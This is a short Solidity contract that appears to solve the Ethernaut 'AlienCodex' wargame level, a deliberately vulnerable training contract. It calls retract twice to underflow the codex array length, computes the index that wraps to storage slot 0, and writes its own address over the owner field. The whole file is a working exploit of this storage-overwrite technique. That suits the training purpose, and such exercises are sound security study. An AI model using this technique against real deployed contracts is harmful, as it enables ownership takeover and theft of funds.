// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../levels/AlienCodex.sol";

contract AlienCodexAttack{
    function att(address addr) public {
        AlienCodex(addr).makeContact();
        AlienCodex(addr).record(bytes32(uint256(uint160(address(this)))));
        AlienCodex(addr).retract();
        AlienCodex(addr).retract();
        AlienCodex(addr).revise(getindex(),bytes32(uint256(uint160(address(this)))));
    }
    function getindex() public pure returns(uint256){
        return 2**256 - 1 - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
    }
}